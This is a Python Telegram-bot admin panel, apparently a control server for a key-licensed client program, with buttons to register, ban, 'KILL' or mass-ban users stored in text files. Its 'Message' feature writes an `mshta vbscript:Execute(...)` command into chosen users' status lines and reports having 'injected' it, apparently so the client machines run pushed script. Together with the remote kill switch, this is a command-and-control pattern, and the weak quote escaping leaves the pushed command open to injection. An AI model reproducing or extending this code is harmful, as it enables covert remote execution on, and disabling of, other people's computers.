import logging
import os
import asyncio
import shutil
import datetime
from flask import Flask, request
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    ConversationHandler,
    MessageHandler,
    filters,
)

# ---------- CONFIGURATION ----------
BOT_TOKEN = os.environ.get("BOT_TOKEN")
ADMIN_ID = int(os.environ.get("ADMIN_ID", 0))

KEYS_FILE = "KEYS.txt"
USERS_FILE = "USERS.txt"
USERS_BACKUP_FILE = "USERS_BACKUP.txt"

# State Constants
(
    MENU_HUB,
    WAITING_FOR_REG,
    WAITING_FOR_GRANT,
    WAITING_FOR_BAN,
    WAITING_FOR_EXEC_USERS,
    WAITING_FOR_EXEC_TEXT,
    WAITING_FOR_DELETE,
    WAITING_FOR_RENAME_OLD,
    WAITING_FOR_RENAME_NEW,
    WAITING_FOR_KILL
) = range(10)

app = Flask(__name__)
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# Ensure files exist
for f in [KEYS_FILE, USERS_FILE]:
    if not os.path.exists(f): open(f, 'a').close()

# ---------- CORE HELPER FUNCTIONS ----------

def ban_all_users_sync():
    if not os.path.exists(USERS_FILE): return 0
    shutil.copyfile(USERS_FILE, USERS_BACKUP_FILE)
    updated_count, new_lines = 0, []
    with open(USERS_FILE, "r") as f: lines = f.readlines()
    for line in lines:
        if " -> " in line:
            new_lines.append(f"{line.split(' -> ')[0].strip()} -> BAN\n")
            updated_count += 1
        else: new_lines.append(line)
    with open(USERS_FILE, "w") as f: f.writelines(new_lines)
    return updated_count

def undo_ban_all_sync():
    if not os.path.exists(USERS_BACKUP_FILE): return False
    shutil.copyfile(USERS_BACKUP_FILE, USERS_FILE)
    return True

def batch_update_users(target_input: str, status_text: str):
    targets = [u.strip() for u in target_input.split('-') if u.strip()]
    count, new_lines = 0, []
    with open(USERS_FILE, "r") as f: lines = f.readlines()
    for line in lines:
        if " -> " in line:
            name = line.split(" -> ")[0].strip()
            if name in targets:
                new_lines.append(f"{name} -> {status_text}\n")
                count += 1
                continue
        new_lines.append(line)
    with open(USERS_FILE, "w") as f: f.writelines(new_lines)
    return count

def delete_sync_users(target_input: str):
    targets = [u.strip() for u in target_input.split('-') if u.strip()]
    with open(USERS_FILE, "r") as f: u_lines = f.readlines()
    with open(KEYS_FILE, "r") as f: k_lines = f.readlines()
    idx = [i for i, l in enumerate(u_lines) if " -> " in l and l.split(" -> ")[0].strip() in targets]
    with open(USERS_FILE, "w") as f: f.writelines([l for i, l in enumerate(u_lines) if i not in idx])
    with open(KEYS_FILE, "w") as f: f.writelines([l for i, l in enumerate(k_lines) if i not in idx])
    return len(idx)

# ---------- UI COMPONENTS ----------

def main_menu_keyboard():
    keyboard = [
        [InlineKeyboardButton("📝 Register", callback_data="m_reg"), InlineKeyboardButton("✅ Grant", callback_data="m_grant")],
        [InlineKeyboardButton("🚫 Ban", callback_data="m_ban"), InlineKeyboardButton("☠️ KILL", callback_data="m_kill")],
        [InlineKeyboardButton("🗑️ Delete", callback_data="m_del"), InlineKeyboardButton("✏️ Rename", callback_data="m_rename")],
        [InlineKeyboardButton("💬 Message", callback_data="m_exec"), InlineKeyboardButton("📋 List", callback_data="m_list")],
        [InlineKeyboardButton("💀 BAN ALL", callback_data="m_ban_all"), InlineKeyboardButton("↩️ Undo Ban", callback_data="m_undo_ban")],
        [InlineKeyboardButton("📥 Backups", callback_data="m_backup"), InlineKeyboardButton("✖️ Close", callback_data="m_cancel")]
    ]
    return InlineKeyboardMarkup(keyboard)

# ---------- HANDLERS ----------

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    if update.effective_user.id != ADMIN_ID: return ConversationHandler.END
    text = "✨ **System Hub Online**"
    if update.callback_query: await update.callback_query.edit_message_text(text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
    else: await update.message.reply_text(text, reply_markup=main_menu_keyboard(), parse_mode="Markdown")
    return MENU_HUB

async def menu_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
    query = update.callback_query
    await query.answer()
    c = query.data
    if c == "m_stop": return await start(update, context)
    if c == "m_reg": await query.edit_message_text("📝 **Registration**\nSend: `KEY USERNAME`", parse_mode="Markdown"); return WAITING_FOR_REG
    if c == "m_exec": await query.edit_message_text("💬 **Message**\nStep 1: Send Username(s) (user1-user2):", parse_mode="Markdown"); return WAITING_FOR_EXEC_USERS
    if c == "m_list":
        with open(USERS_FILE, "r") as f: content = f.read().strip()
        await query.edit_message_text(f"📋 **List:**\n`{content or 'Empty'}`", parse_mode="Markdown", reply_markup=main_menu_keyboard()); return MENU_HUB
    if c == "m_backup":
        for f_path in [USERS_FILE, KEYS_FILE]:
            if os.path.exists(f_path): await context.bot.send_document(chat_id=ADMIN_ID, document=open(f_path, 'rb'))
        return MENU_HUB
    # Map simple status buttons
    status_map = {"m_grant": ("✅ Grant SAFE", WAITING_FOR_GRANT), "m_ban": ("🚫 Ban", WAITING_FOR_BAN), "m_kill": ("☠️ KILL", WAITING_FOR_KILL), "m_del": ("🗑️ Delete", WAITING_FOR_DELETE)}
    if c in status_map:
        await query.edit_message_text(f"{status_map[c][0]}\nSend Username(s):"); return status_map[c][1]
    return MENU_HUB

async def handle_exec_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    context.user_data["exec_targets"] = update.message.text
    await update.message.reply_text("💬 **Step 2:** Enter the message text for the popup:")
    return WAITING_FOR_EXEC_TEXT

async def handle_exec_final(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg_text = update.message.text.replace('"', '""')
    cmd = f'SAFE mshta vbscript:Execute("msgbox ""{msg_text}"":close")'
    count = batch_update_users(context.user_data.get("exec_targets", ""), cmd)
    await update.message.reply_text(f"⚡ Injected message to {count} users.")
    return await start(update, context)

# ---------- APP SETUP ----------
application = Application.builder().token(BOT_TOKEN).build()

application.add_handler(ConversationHandler(
    entry_points=[CommandHandler("start", start)],
    states={
        MENU_HUB: [CallbackQueryHandler(menu_callback)],
        WAITING_FOR_REG: [MessageHandler(filters.TEXT & ~filters.COMMAND, lambda u, c: (open(KEYS_FILE, 'a').write(u.message.text.split()[0]+'\n'), open(USERS_FILE, 'a').write(u.message.text.split()[1]+' -> SAFE\n')) and start(u, c))],
        WAITING_FOR_EXEC_USERS: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_exec_users)],
        WAITING_FOR_EXEC_TEXT: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_exec_final)],
        WAITING_FOR_GRANT: [MessageHandler(filters.TEXT & ~filters.COMMAND, lambda u, c: batch_update_users(u.message.text, "SAFE") and start(u, c))],
        WAITING_FOR_BAN: [MessageHandler(filters.TEXT & ~filters.COMMAND, lambda u, c: batch_update_users(u.message.text, "BAN") and start(u, c))],
        WAITING_FOR_KILL: [MessageHandler(filters.TEXT & ~filters.COMMAND, lambda u, c: batch_update_users(u.message.text, "KILL") and start(u, c))],
        WAITING_FOR_DELETE: [MessageHandler(filters.TEXT & ~filters.COMMAND, lambda u, c: delete_sync_users(u.message.text) and start(u, c))],
    },
    fallbacks=[CallbackQueryHandler(menu_callback, pattern="^m_stop$")],
))

@app.route('/webhook', methods=['POST'])
async def webhook():
    update = Update.de_json(request.get_json(force=True), application.bot)
    await application.process_update(update)
    return "OK", 200

@app.route('/')
def home(): return "Bot is running", 200

async def main():
    await application.initialize()
    await application.start()
    domain = os.environ.get("RAILWAY_PUBLIC_DOMAIN")
    if domain: 
        await application.bot.set_webhook(url=f"https://{domain}/webhook")
    
    from hypercorn.asyncio import serve
    from hypercorn.config import Config
    conf = Config()
    conf.bind = [f"0.0.0.0:{os.environ.get('PORT', 8080)}"]
    await serve(app, conf)

if __name__ == "__main__":
    asyncio.run(main())